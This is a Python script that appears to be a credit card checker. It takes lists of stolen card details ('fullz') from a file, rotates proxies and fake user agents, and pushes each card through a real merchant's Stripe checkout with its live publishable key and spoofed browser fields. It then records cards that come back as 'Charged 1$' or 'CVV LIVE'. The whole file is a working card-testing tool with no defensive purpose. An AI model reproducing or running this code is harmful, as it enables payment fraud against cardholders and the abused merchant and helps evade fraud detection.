import httpx
import random
import time
import uuid
import asyncio
from fake_useragent import UserAgent
from defs import *


async def create_payment_method(fullz, session):
    try:

        cc, mes, ano, cvv = fullz.split("|")
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': UserAgent().random,
        }

        data = {
            'type': 'card',
            'billing_details[address][postal_code]': '10090',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'payment_user_agent': 'stripe.js/3b6d306271; stripe-js-v3/3b6d306271; split-card-element',
            'referrer': 'https://galleryclimatecoalition.org',
            'time_on_page': str(random.randint(10000, 99999)),
            'key': 'pk_live_OC4ftTyuGNtAcLvMnh7Fz889',
            '_stripe_account': 'acct_1HaHgQGvI1equNqy'
        }

        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            id = response.json()['id']
        except:
            return response.text

        cookies = {
            '_gid': 'GA1.2.1559334668.1704710163',
            '__stripe_mid': '97d60ae4-22a2-4a3a-844b-28738c2808df787f53',
            'gcc': '6d5f7d4a988150e8fe107585390e9fec387111d870f4251834d949b986d8eb07f52c6805',
            '_ga': 'GA1.1.1001831138.1704710163',
            '_ga_1WPW8XZC4X': 'GS1.2.1704764300.2.1.1704764483.0.0.0',
            '_ga_X2PLGQ0326': 'GS1.1.1704766313.3.0.1704766338.0.0.0',
            '_ga_GLQ6WNJKR5': 'GS1.1.1704766313.3.0.1704766338.0.0.0',
        }

        headers = {
            'authority': 'galleryclimatecoalition.org',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://galleryclimatecoalition.org',
            'referer': 'https://galleryclimatecoalition.org/store/basket/?checkout-step=3',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': UserAgent().random,
        }

        data = {
            'payment_method_id': id,
            'payment': response.text,
            'proxy_dir': '',
            '_cmspreview': '',
        }

        response = await session.post(
            'https://galleryclimatecoalition.org/cart/stripe_create_confirm_payment_intent/',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        try:
            client_secret = response.json()["payment_intent_client_secret"]
            result = await confirm_payment_intent(fullz, client_secret, session)
            return result
        except:
            return response.text

    except Exception as e:
        print(e)
        return str(e)


async def confirm_payment_intent(fullz, client_secret, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        PK_KEY = "pk_live_OC4ftTyuGNtAcLvMnh7Fz889"
        if client_secret is None:
            return "Failed to Create Client Secret"

        payment_intent = client_secret.split("_secret_")[0]
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US, en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': UserAgent().random,
        }
        data = {
            'payment_method_data[type]': 'card',
            'payment_method_data[card][number]': cc,
            'payment_method_data[card][cvc]': cvv,
            'payment_method_data[card][exp_month]': mes,
            'payment_method_data[card] [exp_year]': ano,
            'payment_method_data[guid]': str(uuid.uuid4()),
            'payment_method_data[muid]': str(uuid.uuid4()),
            'payment_method_data[sid]': str(uuid.uuid4()),
            'payment_method_data[payment_user_agent]': 'stripe.js/e362d03051; stripe-js-v3/e362d03051; split-card-element',
            'payment_method_data[referrer]': 'https://galleryclimatecoalition.org',
            'payment_method_data[time_on_page]': str(random.randint(10000, 99999)),
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': 'true',
            'key': PK_KEY,
            'client_secret': client_secret,
        }

        result = await session.post(
            f'https://api.stripe.com/v1/payment_intents/{payment_intent}/confirm',
            headers=headers,
            data=data,
        )

        if "three_d_secure_2_source" in result.text:
            await authenticate(result.json(), PK_KEY, session)

        if "three_ds_method_url" in result.text:
            await one_click_3d_check(result.json(), session)

        await asyncio.sleep(0.5)
        result = await session.get(
            f"https://api.stripe.com/v1/payment_intents/{payment_intent}?key={PK_KEY}&is_stripe_sdk=false&client_secret={client_secret}"
        )

        return result.text
    except Exception as e:
        print(e)
        return str(e)


async def multi_checking(x):
    start = time.time()
    getproxy = random.choice(
        open("proxy.txt", "r", encoding="utf-8").read().splitlines())
    proxy_ip = getproxy.split(":")[0]
    proxy_port = getproxy.split(":")[1]
    proxy_user = getproxy.split(":")[2]
    proxy_password = getproxy.split(":")[3]
    proxies = {
        "https://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
        "http://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
    }
    session = httpx.AsyncClient(timeout=40, proxies=proxies)
    result = await create_payment_method(x, session)
    response = await charge_resp(result)
    resp = f"{x} - {response} - Taken {round(time.time() - start, 2)}s"
    if "Charged 1$" in response or "CCN Live" in response or "CVV LIVE" in response:
        # charge test
        with open("charge.txt", "a", encoding="utf-8") as file:
            file.write(resp + "\n")
    print(resp)
    await session.aclose()
    await asyncio.sleep(0.5)


async def main():
    ccs = open("ccs.txt", "r", encoding="utf-8").read().splitlines()

    # for x in ccs:
    #    await multi_checking(x)
    #    exit()

    works = [multi_checking(i) for i in ccs]
    worker_num = 5
    while works:
        a = works[:worker_num]
        a = await asyncio.gather(*a)
        works = works[worker_num:]

if __name__ == "__main__":
    asyncio.run(main())
